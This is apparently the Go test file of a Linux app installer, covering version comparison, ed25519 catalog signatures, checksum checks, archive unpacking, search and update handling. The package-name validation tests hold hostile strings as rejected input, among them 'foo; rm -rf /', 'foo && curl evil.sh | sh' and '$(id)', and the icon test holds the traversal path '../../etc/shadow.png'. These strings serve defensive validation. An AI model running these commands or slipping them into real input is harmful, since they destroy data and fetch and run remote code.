package main

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestCompareVersions(t *testing.T) {
	cases := []struct {
		a, b string
		want int
	}{
		{"1.2.3", "1.2.3", 0},
		{"1.10.0", "1.9.9", 1},
		{"1.9.9", "1.10.0", -1},
		{"2.0", "2.0.1", -1},
		{"1.2.0", "1.2-rc1", 1},
		{"continuous", "continuous", 0},
		{"2024.1", "2023.12", 1},
	}
	for _, c := range cases {
		if got := compareVersions(c.a, c.b); got != c.want {
			t.Errorf("compareVersions(%q,%q) = %d, want %d", c.a, c.b, got, c.want)
		}
	}
}

func TestSplitRef(t *testing.T) {
	if n, v := splitRef("discord"); n != "discord" || v != "" {
		t.Errorf("got %q %q", n, v)
	}
	if n, v := splitRef("discord@1.2.3"); n != "discord" || v != "1.2.3" {
		t.Errorf("got %q %q", n, v)
	}
}

// Catalog data must never be able to reach a root shell.
func TestPackageNameValidation(t *testing.T) {
	good := []string{"libfuse2t64", "zlib-ng-compat", "gcc-c++", "python3.11", "libx11-6"}
	for _, s := range good {
		if !pkgNameOK.MatchString(s) {
			t.Errorf("%q should be accepted", s)
		}
	}
	bad := []string{
		"foo; rm -rf /",
		"foo && curl evil.sh | sh",
		"$(id)",
		"`id`",
		"foo|bar",
		"-rm",
		"",
		"pkg name",
	}
	for _, s := range bad {
		if pkgNameOK.MatchString(s) {
			t.Errorf("%q must be rejected", s)
		}
	}
}

func TestInstallCommandNeverUsesShell(t *testing.T) {
	for _, fam := range []string{"debian", "fedora", "suse", "arch"} {
		cmd, err := installCommand(fam, []string{"libfoo"})
		if err != nil {
			t.Fatalf("%s: %v", fam, err)
		}
		if os.Geteuid() != 0 {
			if cmd[0] != "sudo" {
				t.Errorf("%s: expected sudo prefix, got %q", fam, cmd[0])
			}
			cmd = cmd[1:]
		}
		switch fam {
		case "debian":
			if cmd[0] != "apt-get" {
				t.Errorf("debian: got %q", cmd[0])
			}
		case "fedora":
			if cmd[0] != "dnf" {
				t.Errorf("fedora: got %q", cmd[0])
			}
		case "suse":
			if cmd[0] != "zypper" {
				t.Errorf("suse: got %q", cmd[0])
			}
		case "arch":
			if cmd[0] != "pacman" {
				t.Errorf("arch: got %q", cmd[0])
			}
		}
		if cmd[len(cmd)-1] != "libfoo" {
			t.Errorf("%s: package name not last: %v", fam, cmd)
		}
	}
	if _, err := installCommand("gentoo", []string{"x"}); err == nil {
		t.Error("unsupported family should error")
	}
}

func TestSignatureRoundTrip(t *testing.T) {
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	t.Setenv("GLP_TRUST_KEY", hex.EncodeToString(pub))

	payload := []byte(`{"schema":1,"apps":[]}`)
	sig := base64.StdEncoding.EncodeToString(ed25519.Sign(priv, payload))

	if err := verifySignature(payload, []byte(sig)); err != nil {
		t.Fatalf("valid signature rejected: %v", err)
	}
	if err := verifySignature([]byte(`{"schema":1,"apps":[]} `), []byte(sig)); err == nil {
		t.Fatal("tampered payload accepted")
	}
}

func TestSignatureWrongKey(t *testing.T) {
	_, priv, _ := ed25519.GenerateKey(rand.Reader)
	other, _, _ := ed25519.GenerateKey(rand.Reader)
	t.Setenv("GLP_TRUST_KEY", hex.EncodeToString(other))

	payload := []byte("catalog")
	sig := base64.StdEncoding.EncodeToString(ed25519.Sign(priv, payload))
	if err := verifySignature(payload, []byte(sig)); err == nil {
		t.Fatal("signature from an untrusted key was accepted")
	}
}

func TestCopyVerifiedRejectsBadChecksum(t *testing.T) {
	dir := t.TempDir()
	dest := filepath.Join(dir, "out.AppImage")
	err := copyVerified(strings.NewReader("malicious payload"), dest, 17,
		"0000000000000000000000000000000000000000000000000000000000000000")
	if err == nil {
		t.Fatal("bad checksum accepted")
	}
	if _, statErr := os.Stat(dest); !os.IsNotExist(statErr) {
		t.Fatal("file was left behind after a failed checksum")
	}
}

func TestIndexSearchRanking(t *testing.T) {
	idx := &Index{Apps: []App{
		{Name: "keeper", Summary: "a notes app"},
		{Name: "notes", Summary: "take notes"},
	}}
	res := idx.Search("notes")
	if len(res) != 2 {
		t.Fatalf("expected 2 results, got %d", len(res))
	}
	if res[0].Name != "notes" {
		t.Errorf("name match should rank first, got %q", res[0].Name)
	}
}

func TestChompCells(t *testing.T) {
	s := chompCells(5, false)
	if len(s) != barWidth {
		t.Fatalf("bar width = %d, want %d", len(s), barWidth)
	}
	if strings.Count(s, "C") != 1 {
		t.Fatalf("expected exactly one pacman, got %q", s)
	}
	for i, r := range s {
		switch {
		case i < 5:
			if r != ' ' {
				t.Errorf("cell %d should be eaten, got %q", i, r)
			}
		case i == 5:
			if r != 'C' {
				t.Errorf("cell %d should be pacman, got %q", i, r)
			}
		default:
			if r != '-' {
				t.Errorf("cell %d should be a pellet, got %q", i, r)
			}
		}
	}

	// Removal runs backwards: pellets survive on the left of the head.
	r := chompCells(5, true)
	for i, c := range r {
		switch {
		case i < 5:
			if c != '-' {
				t.Errorf("reverse cell %d should be a pellet, got %q", i, c)
			}
		case i > 5:
			if c != ' ' {
				t.Errorf("reverse cell %d should be eaten, got %q", i, c)
			}
		}
	}

	// Out-of-range heads clamp instead of panicking.
	if !strings.HasSuffix(chompCells(999, false), "C") {
		t.Error("head above width should clamp to the last cell")
	}
	if !strings.HasPrefix(chompCells(-3, false), "C") {
		t.Error("negative head should clamp to the first cell")
	}
}

func TestParseProvides(t *testing.T) {
	dnfOut := `libXScrnSaver-1.2.4-8.fc44.x86_64 : X Screen Saver client library
Repo         : fedora
Matched from:
Provide    : libXss.so.1()(64bit)

gcc-c++-14.2.1-3.fc44.x86_64 : C++ support
`
	if got := parseDnfProvides(dnfOut); len(got) != 2 || got[0] != "libXScrnSaver" || got[1] != "gcc-c++" {
		t.Errorf("parseDnfProvides = %v", got)
	}

	aptOut := "libxss1: /usr/lib/x86_64-linux-gnu/libXss.so.1\n"
	if got := parseAptFile(aptOut); len(got) != 1 || got[0] != "libxss1" {
		t.Errorf("parseAptFile = %v", got)
	}

	pacOut := "extra/libxss 1.2.4-1 [installed]\n    usr/lib/libXss.so.1\n"
	if got := parsePacmanFile(pacOut); len(got) != 1 || got[0] != "libxss" {
		t.Errorf("parsePacmanFile = %v", got)
	}
}

func TestLibIndexAndScriptDetection(t *testing.T) {
	dir := t.TempDir()
	os.MkdirAll(filepath.Join(dir, "usr", "lib"), 0o755)
	os.WriteFile(filepath.Join(dir, "usr", "lib", "libfoo.so.1"), []byte("x"), 0o644)
	idx := libIndex(dir)
	if !idx["libfoo.so.1"] {
		t.Error("bundled library not indexed")
	}

	script := filepath.Join(dir, "run")
	os.WriteFile(script, []byte("#!/bin/sh\necho hi\n"), 0o755)
	if !isScript(script) {
		t.Error("shebang not detected")
	}
	if isScript(filepath.Join(dir, "usr", "lib", "libfoo.so.1")) {
		t.Error("libfoo misdetected as a script")
	}
}

func TestBinName(t *testing.T) {
	if got := binName("zen", "AppRun"); got != "zen" {
		t.Errorf("binName = %q, want zen", got)
	}
	if got := binName("usr/bin/discord", "usr/bin/discord"); got != "discord" {
		t.Errorf("binName = %q, want discord", got)
	}
}

func TestArchMatches(t *testing.T) {
	a := &App{Archs: []string{"x86_64", "aarch64"}}
	if !a.ArchMatches("amd64") || !a.ArchMatches("arm64") {
		t.Error("expected both arches to match")
	}
	if a.ArchMatches("386") {
		t.Error("386 should not match")
	}
	b := &App{}
	if !b.ArchMatches("amd64") {
		t.Error("empty arch list means any")
	}
}

func TestBinsRenaming(t *testing.T) {
	if got := binName("telegram=Telegram", "Telegram"); got != "telegram" {
		t.Errorf("binName = %q, want telegram", got)
	}
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "Telegram"), []byte("x"), 0o755)
	rel, err := resolveBin(dir, "telegram=Telegram")
	if err != nil || rel != "Telegram" {
		t.Errorf("resolveBin = %q, %v", rel, err)
	}
}

func TestUnpackZip(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "a.zip")
	f, err := os.Create(archive)
	if err != nil {
		t.Fatal(err)
	}
	zw := zip.NewWriter(f)
	w, err := zw.CreateHeader(&zip.FileHeader{Name: "bin/app", Method: zip.Deflate})
	if err != nil {
		t.Fatal(err)
	}
	w.Write([]byte("#!/bin/sh\necho hi\n"))
	zw.Close()
	f.Close()

	dest := filepath.Join(dir, "out")
	if err := os.MkdirAll(dest, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := unpackZip(archive, dest); err != nil {
		t.Fatal(err)
	}
	got, err := os.ReadFile(filepath.Join(dest, "bin", "app"))
	if err != nil || string(got) != "#!/bin/sh\necho hi\n" {
		t.Errorf("zip content = %q, %v", got, err)
	}
}

func TestRunBuildPlaceholders(t *testing.T) {
	dir := t.TempDir()
	src := filepath.Join(dir, "src")
	dest := filepath.Join(dir, "dest")
	os.MkdirAll(src, 0o755)
	os.WriteFile(filepath.Join(src, "hello"), []byte("hi"), 0o644)

	app := &App{Build: &Build{Commands: [][]string{
		{"/bin/mkdir", "-p", "{dest}/usr/bin"},
		{"/bin/cp", "{src}/hello", "{dest}/usr/bin/hello"},
	}}}
	if err := runBuild(app, src, dest, filepath.Join(dir, "final")); err != nil {
		t.Fatal(err)
	}
	if b, err := os.ReadFile(filepath.Join(dest, "usr", "bin", "hello")); err != nil || string(b) != "hi" {
		t.Errorf("build output = %q, %v", b, err)
	}
}

func TestSourcesNeedDeps(t *testing.T) {
	app := &App{Deps: map[string][]string{"fedora": {"definitely-not-installed-pkg"}}}
	if fam := distroFamily(); fam == "fedora" && depsSatisfied(app) {
		t.Error("missing package reported as satisfied")
	}
}

func TestOnlyAppImageFindsNested(t *testing.T) {
	dir := t.TempDir()
	deep := filepath.Join(dir, "__w", "app", "app")
	os.MkdirAll(deep, 0o755)
	one := filepath.Join(deep, "Tool.AppImage")
	os.WriteFile(one, []byte("x"), 0o644)

	if got := onlyAppImage(dir, 4); got != one {
		t.Errorf("onlyAppImage = %q, want %q", got, one)
	}
	os.WriteFile(filepath.Join(deep, "Other.AppImage"), []byte("x"), 0o644)
	if got := onlyAppImage(dir, 4); got != "" {
		t.Errorf("two AppImages should be ambiguous, got %q", got)
	}
}

func TestSniffIconExt(t *testing.T) {
	dir := t.TempDir()
	png := filepath.Join(dir, "a")
	os.WriteFile(png, append([]byte("\x89PNG\r\n\x1a\n"), make([]byte, 16)...), 0o644)
	if got := sniffIconExt(png); got != ".png" {
		t.Errorf("png sniff = %q", got)
	}
	svg := filepath.Join(dir, "b")
	os.WriteFile(svg, []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>`), 0o644)
	if got := sniffIconExt(svg); got != ".svg" {
		t.Errorf("svg sniff = %q", got)
	}
}

func TestRelForPrefersAppRun(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "AppRun"), []byte("#!/bin/sh\n"), 0o755)
	os.MkdirAll(filepath.Join(dir, "usr", "bin"), 0o755)
	os.WriteFile(filepath.Join(dir, "usr", "bin", "tool"), []byte("x"), 0o755)

	app := &App{Format: "zip", Bins: []string{"tool"}}
	got, err := relFor(app, dir, "tool")
	if err != nil {
		t.Fatal(err)
	}
	if got != "AppRun" {
		t.Errorf("relFor = %q, want AppRun", got)
	}
}

func TestUnpackDeb(t *testing.T) {
	dir := t.TempDir()
	archive := filepath.Join(dir, "a.deb")

	// data.tar.gz with one file.
	var payload bytes.Buffer
	gz := gzip.NewWriter(&payload)
	tw := tar.NewWriter(gz)
	body := []byte("#!/bin/sh\necho hi\n")
	tw.WriteHeader(&tar.Header{Name: "usr/bin/app", Mode: 0o755, Size: int64(len(body))})
	tw.Write(body)
	tw.Close()
	gz.Close()

	var deb bytes.Buffer
	deb.WriteString("!<arch>\n")
	writeAr := func(name string, data []byte) {
		fmt.Fprintf(&deb, "%-16s%-12d%-6d%-6d%-8s%-10d`\n", name, 0, 0, 0, "100644", len(data))
		deb.Write(data)
		if len(data)%2 == 1 {
			deb.WriteByte('\n')
		}
	}
	writeAr("debian-binary", []byte("2.0\n"))
	writeAr("control.tar.gz", []byte("not used"))
	writeAr("data.tar.gz/", payload.Bytes())
	os.WriteFile(archive, deb.Bytes(), 0o644)

	dest := filepath.Join(dir, "out")
	os.MkdirAll(dest, 0o755)
	if err := unpackDeb(archive, dest); err != nil {
		t.Fatal(err)
	}
	got, err := os.ReadFile(filepath.Join(dest, "usr", "bin", "app"))
	if err != nil || string(got) != string(body) {
		t.Errorf("deb content = %q, %v", got, err)
	}
}

func matchIndex() *Index {
	return &Index{Apps: []App{
		{Name: "winboat", Summary: "Run Windows apps on Linux", Bins: []string{"winboat"}},
		{Name: "vscode", Summary: "Code editor", Bins: []string{"code"},
			Desktop: &Desktop{Name: "Visual Studio Code"}},
		{Name: "vscodium", Summary: "VS Code without telemetry", Bins: []string{"codium"}},
		{Name: "brave-browser", Summary: "Chromium with ad blocking"},
		{Name: "helium-browser", Summary: "Privacy Chromium browser"},
		{Name: "zen-browser", Summary: "Firefox based browser"},
		{Name: "steam", Summary: "Game store", Bins: []string{"usr/bin/steam"}},
	}}
}

func suggestNames(idx *Index, q string) []string {
	var out []string
	for _, a := range idx.Suggest(q) {
		out = append(out, a.Name)
	}
	return out
}

func TestSuggestPrefix(t *testing.T) {
	idx := matchIndex()
	got := suggestNames(idx, "win")
	if len(got) == 0 || got[0] != "winboat" {
		t.Fatalf("win -> %v, want winboat first", got)
	}
}

func TestSuggestAliases(t *testing.T) {
	idx := matchIndex()
	// A launcher command is a valid way to name the app.
	if got := suggestNames(idx, "code"); len(got) == 0 || got[0] != "vscode" {
		t.Errorf("code -> %v, want vscode first", got)
	}
	// So is the menu label.
	if got := suggestNames(idx, "visual"); len(got) == 0 || got[0] != "vscode" {
		t.Errorf("visual -> %v, want vscode first", got)
	}
	// A path in bins still resolves to its base name.
	if got := suggestNames(idx, "steam"); len(got) == 0 || got[0] != "steam" {
		t.Errorf("steam -> %v, want steam first", got)
	}
}

func TestSuggestSubstringAndTypo(t *testing.T) {
	idx := matchIndex()
	if got := suggestNames(idx, "browser"); len(got) != 3 {
		t.Errorf("browser -> %v, want three browsers", got)
	}
	if got := suggestNames(idx, "vscod"); len(got) < 2 || got[0] != "vscode" || got[1] != "vscodium" {
		t.Errorf("vscod -> %v, want vscode then vscodium", got)
	}
	if got := suggestNames(idx, "zzzz"); len(got) != 0 {
		t.Errorf("zzzz -> %v, want nothing", got)
	}
	// One or two characters are too vague to suggest anything.
	if got := suggestNames(idx, "v"); len(got) != 0 {
		t.Errorf("v -> %v, want nothing", got)
	}
}

func TestResolveAppExactNeedsNoPrompt(t *testing.T) {
	idx := matchIndex()
	app, err := resolveApp(idx, "Steam")
	if err != nil {
		t.Fatal(err)
	}
	if app.Name != "steam" {
		t.Errorf("got %s", app.Name)
	}
	if _, err := resolveApp(idx, "zzzz"); err == nil {
		t.Error("unknown name should fail")
	}
}

func TestEditDistance(t *testing.T) {
	cases := []struct {
		a, b string
		want int
	}{
		{"steam", "steam", 0},
		{"steam", "stam", 1},
		{"steam", "stema", 2},
		{"winboat", "winbot", 1},
		{"", "abc", 3},
	}
	for _, c := range cases {
		if got := editDistance(c.a, c.b); got != c.want {
			t.Errorf("editDistance(%q,%q) = %d, want %d", c.a, c.b, got, c.want)
		}
	}
}

func TestRankInstalledNames(t *testing.T) {
	names := []string{"winboat", "vscode", "lazygit"}
	if got := rankNames(names, "lazy"); len(got) == 0 || got[0] != "lazygit" {
		t.Errorf("lazy -> %v", got)
	}
	if got := rankNames(names, "w"); len(got) != 0 {
		t.Errorf("single letter -> %v, want nothing", got)
	}
	if got := rankNames(names, "vscod"); len(got) == 0 || got[0] != "vscode" {
		t.Errorf("vscod -> %v", got)
	}
}

func TestBlobExt(t *testing.T) {
	cases := []struct {
		app  *App
		want string
	}{
		{&App{URL: "https://x/y.AppImage"}, ".appimage"},
		{&App{URL: "https://x/y.tar.gz?token=1"}, ".tar.gz"},
		{&App{URL: "https://x/y.deb"}, ".deb"},
		// An itch entry has no filename in the URL, so the declared format
		// decides the cache suffix.
		{&App{Format: "zip", Itch: &Itch{Page: "https://x", Upload: 1}}, ".zip"},
		{&App{Format: "tar.xz", Itch: &Itch{Page: "https://x", Upload: 1}}, ".tar.xz"},
		{&App{}, ".bin"},
	}
	for _, c := range cases {
		if got := blobExt(c.app); got != c.want {
			t.Errorf("blobExt(%q, format %q) = %q, want %q", c.app.URL, c.app.Format, got, c.want)
		}
	}
}

func TestItchEntryValidation(t *testing.T) {
	if _, err := itchFileURL(&App{Name: "x"}); err == nil {
		t.Error("an app without an itch block should fail")
	}
	if _, err := itchFileURL(&App{Name: "x", Itch: &Itch{Upload: 1}}); err == nil {
		t.Error("an entry without a page should fail")
	}
	if _, err := itchFileURL(&App{Name: "x", Itch: &Itch{Page: "https://x"}}); err == nil {
		t.Error("an entry without an upload id should fail")
	}
}

func TestSearchMatchesAliases(t *testing.T) {
	idx := &Index{Apps: []App{
		{Name: "fnf-game", Summary: "Rhythm game", Bins: []string{"funkin=Funkin"},
			Desktop: &Desktop{Name: "Friday Night Funkin'"}},
		{Name: "keeper", Summary: "a notes app"},
	}}
	// The command name and the menu label both find the app, even though
	// neither appears in the catalog name.
	for _, term := range []string{"funkin", "friday", "fnf"} {
		res := idx.Search(term)
		if len(res) != 1 || res[0].Name != "fnf-game" {
			t.Errorf("search %q = %v, want fnf-game", term, res)
		}
	}
	// A name or alias hit still ranks above a summary-only hit.
	idx.Apps[0].Summary = "keyboard game"
	idx.Apps[1].Summary = "a rhythm game for notes"
	res := idx.Search("game")
	if len(res) != 2 || res[0].Name != "fnf-game" {
		t.Errorf("search game = %v, want fnf-game first", res)
	}
}

func TestMissingDepsValidatesNames(t *testing.T) {
	fam := distroFamily()
	if fam == "" {
		t.Skip("no distro family on this machine")
	}
	// A catalog must never smuggle a command into the package manager.
	app := &App{Deps: map[string][]string{fam: {"vlc; rm -rf /"}}}
	if _, err := missingDeps(app); err == nil {
		t.Error("a package name with a separator should be refused")
	}
}

func TestInstallDepsNeedsRootApproval(t *testing.T) {
	if distroFamily() == "" {
		t.Skip("no distro family on this machine")
	}
	missing := []string{"glp-test-package-that-does-not-exist"}
	// Without approval nothing runs, the command is only carried for display.
	err := installDeps(missing, false)
	var need *rootNeeded
	if !errors.As(err, &need) {
		t.Fatalf("installDeps without approval = %v, want rootNeeded", err)
	}
	cmd := strings.Join(need.cmd, " ")
	if !strings.Contains(cmd, "glp-test-package-that-does-not-exist") {
		t.Errorf("command %q does not name the package", cmd)
	}
	// Nothing to install is never an error.
	if err := installDeps(nil, false); err != nil {
		t.Errorf("installDeps(nil) = %v", err)
	}
}

func TestResolverHint(t *testing.T) {
	if !strings.Contains(resolverHint("arch"), "pacman -Fy") {
		t.Errorf("arch hint = %q, want the file database step", resolverHint("arch"))
	}
	if !strings.Contains(resolverHint("debian"), "apt-file") {
		t.Errorf("debian hint = %q, want apt-file", resolverHint("debian"))
	}
	if resolverHint("fedora") == "" {
		t.Error("every family needs a hint")
	}
	if !strings.Contains(resolverHint("nixos"), "nix-ld") {
		t.Errorf("nixos hint = %q, want nix-ld", resolverHint("nixos"))
	}
}

func TestDistroFamily(t *testing.T) {
	cases := []struct {
		name      string
		osRelease string
		want      string
	}{
		{"nixos", "ID=nixos\nID_LIKE=\"\"\n", "nixos"},
		{"ubuntu", "ID=ubuntu\nID_LIKE=debian\n", "debian"},
		{"fedora", "ID=fedora\n", "fedora"},
		{"tumbleweed", "ID=\"opensuse-tumbleweed\"\nID_LIKE=\"opensuse suse\"\n", "suse"},
		{"endeavouros", "ID=endeavouros\nID_LIKE=arch\n", "arch"},
		{"unknown", "ID=void\n", ""},
	}
	for _, tc := range cases {
		if got := distroFamilyFrom(tc.osRelease); got != tc.want {
			t.Errorf("%s = %q, want %q", tc.name, got, tc.want)
		}
	}
}

func TestIconPathStaysInside(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "logo.png"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := iconPath(dir, "logo.png"); got == "" {
		t.Error("a plain path should resolve")
	}
	if got := iconPath(dir, "../../etc/shadow.png"); got != "" {
		t.Errorf("escaping path resolved to %q", got)
	}
	if got := iconPath(dir, "logo.svg"); got != "" {
		t.Error("only png is supported")
	}
	if got := iconPath(dir, "missing.png"); got != "" {
		t.Error("a missing file should not resolve")
	}
}

func TestWriteIconCropsFrame(t *testing.T) {
	dir := t.TempDir()
	src := filepath.Join(dir, "sheet.png")
	sheet := image.NewNRGBA(image.Rect(0, 0, 4, 2))
	for y := 0; y < 2; y++ {
		for x := 0; x < 4; x++ {
			c := color.NRGBA{B: 255, A: 255}
			if x < 2 {
				c = color.NRGBA{R: 255, A: 255}
			}
			sheet.Set(x, y, c)
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, sheet); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(src, buf.Bytes(), 0o644); err != nil {
		t.Fatal(err)
	}

	dest := filepath.Join(dir, "icon.png")
	if err := writeIcon(src, dest, []int{0, 0, 2, 2}); err != nil {
		t.Fatal(err)
	}
	f, err := os.Open(dest)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	got, err := png.Decode(f)
	if err != nil {
		t.Fatal(err)
	}
	if b := got.Bounds(); b.Dx() != 2 || b.Dy() != 2 {
		t.Fatalf("cropped size = %v, want 2x2", b)
	}
	r, _, bl, _ := got.At(0, 0).RGBA()
	if r>>8 != 255 || bl>>8 != 0 {
		t.Errorf("first frame pixel = %04x/%04x, want red", r, bl)
	}
	// A crop outside the sheet must fail loudly, not produce a broken icon.
	if err := writeIcon(src, dest, []int{3, 0, 2, 2}); err == nil {
		t.Error("an oversized crop should fail")
	}
}

func TestIconEntryValidation(t *testing.T) {
	// A plain icon path is copied as is.
	dir := t.TempDir()
	src := filepath.Join(dir, "logo.png")
	sheet := image.NewNRGBA(image.Rect(0, 0, 1, 1))
	var buf bytes.Buffer
	png.Encode(&buf, sheet)
	os.WriteFile(src, buf.Bytes(), 0o644)
	dest := filepath.Join(dir, "copy.png")
	if err := writeIcon(src, dest, nil); err != nil {
		t.Fatal(err)
	}
	if !fileExists(dest) {
		t.Error("a plain icon should be copied")
	}
}

func TestWorkdirLauncher(t *testing.T) {
	dir := t.TempDir()
	link := filepath.Join(dir, "game")
	if err := writeLauncher(link, "/x/current/Game", "/x/current"); err != nil {
		t.Fatal(err)
	}
	b, err := os.ReadFile(link)
	if err != nil {
		t.Fatal(err)
	}
	s := string(b)
	if !strings.Contains(s, "cd /x/current") {
		t.Errorf("launcher does not enter the app directory:\n%s", s)
	}
	if !strings.Contains(s, `exec /x/current/Game "$@"`) {
		t.Errorf("launcher does not exec the app with its arguments:\n%s", s)
	}

	app := &App{Name: "game", Workdir: true}
	content := generateDesktop(app, "/x/current/Game", "game", "/x/current")
	if !strings.Contains(content, "Path=/x/current\n") {
		t.Errorf("desktop entry has no Path:\n%s", content)
	}

	// An upstream entry gets the same key when the app needs it.
	raw := "[Desktop Entry]\nType=Application\nName=Game\nExec=Game\nIcon=game\n"
	patched := patchDesktop(raw, "/x/current/Game", "game", "Game", "/x/current")
	if !strings.Contains(patched, "Path=/x/current\n") {
		t.Errorf("patched entry has no Path:\n%s", patched)
	}
	// Without the flag nothing is added.
	plain := generateDesktop(&App{Name: "plain"}, "/x/plain", "", "")
	if strings.Contains(plain, "Path=") {
		t.Errorf("plain entry should not set Path:\n%s", plain)
	}
}

func TestUpdateMissingChannel(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	}))
	defer srv.Close()
	t.Setenv("GLP_UPDATE_URL", srv.URL+"/update.json")

	_, err := fetchUpdateManifest()
	var nr *noRelease
	if !errors.As(err, &nr) {
		t.Fatalf("404 = %v, want noRelease", err)
	}
	if !strings.Contains(nr.Error(), srv.URL) {
		t.Errorf("message %q does not name the source", nr.Error())
	}
	// An unpublished channel is not a failure: glp says so and exits clean.
	if err := cmdUpdate([]string{"--check"}); err != nil {
		t.Errorf("cmdUpdate with no channel = %v, want nil", err)
	}

	// A server error is still an error, not "nothing to check".
	broken := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusInternalServerError)
	}))
	defer broken.Close()
	t.Setenv("GLP_UPDATE_URL", broken.URL+"/update.json")
	if _, err := fetchUpdateManifest(); err == nil || errors.As(err, &nr) {
		t.Errorf("500 = %v, want a real error", err)
	}
}

func TestUpdateUnreachable(t *testing.T) {
	// A server that is gone looks like a connection error.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	dead := srv.URL + "/update.json"
	srv.Close()
	t.Setenv("GLP_UPDATE_URL", dead)
	err := cmdUpdate([]string{"--check"})
	if err == nil || !strings.Contains(err.Error(), "not responding") {
		t.Fatalf("closed server = %v, want a not responding error", err)
	}
	if strings.Contains(err.Error(), "http") || strings.Contains(err.Error(), "update.json") {
		t.Errorf("message leaks the source: %v", err)
	}

	// A broken server answer gets the same short message, no status code.
	broken := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusInternalServerError)
	}))
	defer broken.Close()
	t.Setenv("GLP_UPDATE_URL", broken.URL+"/update.json")
	err = cmdUpdate([]string{"--check"})
	if err == nil || err.Error() != "update servers are not responding" {
		t.Errorf("500 = %v, want the short message", err)
	}
}

func TestPendingUpdates(t *testing.T) {
	t.Setenv("HOME", t.TempDir())
	if err := writeMeta(Meta{Name: "discord", Version: "0.0.84"}); err != nil {
		t.Fatal(err)
	}
	if err := writeMeta(Meta{Name: "steam", Version: "1.0.0"}); err != nil {
		t.Fatal(err)
	}
	idx := &Index{Apps: []App{
		{Name: "discord", Version: "0.0.90", Size: 100 << 20},
		{Name: "steam", Version: "1.0.0"},
		{Name: "notinstalled", Version: "2.0.0"},
	}}
	ups := pendingUpdates(idx)
	if len(ups) != 1 {
		t.Fatalf("pending = %+v, want only discord", ups)
	}
	if ups[0].Name != "discord" || ups[0].Installed != "0.0.84" || ups[0].Available != "0.0.90" {
		t.Errorf("pending entry = %+v", ups[0])
	}
	// An empty catalog means nothing to offer, not a panic.
	if got := pendingUpdates(&Index{}); len(got) != 0 {
		t.Errorf("empty catalog = %+v", got)
	}
}
